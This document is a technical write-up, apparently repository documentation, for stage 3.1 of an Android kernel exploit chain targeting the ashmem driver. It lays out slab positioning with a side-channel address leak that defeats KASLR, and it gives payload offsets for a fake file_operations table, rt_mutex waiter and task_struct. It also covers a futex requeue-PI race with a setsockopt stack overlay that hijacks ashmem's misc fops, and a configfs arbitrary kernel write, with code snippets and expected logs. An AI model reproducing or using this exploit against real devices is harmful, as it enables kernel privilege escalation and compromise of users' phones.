# 03. mm/slab, payload, and 3.1 route loop

The 3.1 route has a narrow target: temporarily route `dashmem_misc.fops` to the fake fops table in the prepared page, trigger the observation, then restore the original `ashmem_fops` and print `route-summary`.

## mm/slab positioning

`rc_prepare_fops_page()`:

1. forks clone children and opens `/proc/<pid>/mem` to shape reclaimable `mm_struct` layout;
2. runs `kernelsnitch_setup()`, `kernelsnitch_find_collisions()`, and `kernelsnitch_bruteforce()`;
3. recovers an `mm_struct` address;
4. aligns it to an order-3 slab base with `leaked & ~0x7fff`.

Key logs:

```text
[*] prepare_kernel_page geom ... mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch collision-scan leaked mm=...
```

`PAGE_PREP_SLABS` defaults to `16`. Retry workers raise it to `32`; this only changes preparation scale.

## Payload layout

`rc_prepare_skb_payload()` writes two 32 KiB chunks into one slab page. `RC_IMG_BIAS=0xe80` aligns the chunk to the later sk_buff copy position.

| Name | Offset | Use |
| --- | ---: | --- |
| `RC_FOPS_OFF` | `0x1000` | fake `file_operations` table |
| `RC_LOCK_OFF` | `0x1350` | fake rt_mutex lock |
| `RC_SCRATCH_OFF` | `0x1700` | configfs write-window scratch area |
| `RC_W0_OFF` | `0x2220` | fake top waiter |
| `RC_RIGHT_OFF` | `0x4440` | rb-tree route right node |
| `RC_LEFT_OFF` | `0x5560` | rb-tree route left node |
| `RC_TASK_OFF` | `0x5800` | minimal fake task_struct fields |

Fake fops slots:

| fops slot | Value |
| --- | --- |
| `.llseek` | `fake_w0 + 24` |
| `.read` | `configfs_read_bin_file.cfi_jt` |
| `.write` | `configfs_write_bin_file.cfi_jt` |
| `.unlocked_ioctl` | `ashmem_ioctl.cfi_jt` |
| `.compat_ioctl` | `compat_ashmem_ioctl.cfi_jt` |
| `.mmap` | `ashmem_mmap.cfi_jt` |
| `.open` | `ashmem_open.cfi_jt` |
| `.release` | `ashmem_release.cfi_jt` |
| `.splice_read` | `generic_file_splice_read.cfi_jt` |
| `.show_fdinfo` | `ashmem_show_fdinfo.cfi_jt` |

The payload self-check reads both chunks and verifies the lock, waiter, task, and fops fields before the route starts.

## Route trigger

`rc_run_main_route_threads()` starts three threads:

- waiter: locks `rc_f_pi_chain`, then enters `FUTEX_WAIT_REQUEUE_PI`;
- owner: owns `rc_f_pi_target`, then blocks on `rc_f_pi_chain` to form the PI chain;
- consumer: waits for the IP route sequence, then calls `sched_setattr()` on the waiter tid.

The main thread calls:

```c
futex_op(&rc_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &rc_f_pi_target, 0);
```

The waiter then enters `rc_slide_ip_stack_copy()`. `setsockopt(MCAST_JOIN_GROUP)` supplies the kernel stack copy overlay. The overlay points `tree_entry` at `ASHMEM_MISC_FOPS_ALIAS - 8` and places the fake fops address as the right-node value.

## Restore and route-summary

After routing, the worker opens ashmem again and uses the fake fops configfs write window to restore `dashmem_misc.fops`:

```c
uint64_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
uint64_t original = kaslr_base + ASHMEM_FOPS_OFF;
rc_configfs_write_once(afd, misc_fops, &original, 8);
```

Successful closure:

```text
[*] misc.fops restore ... ret=8 errno=0
[+] misc.fops restored to ashmem_fops
[+] route-summary ... kaslr=1 ... route_done=1
```

That is the end of 3.1. The current repository does not continue into a second stage.
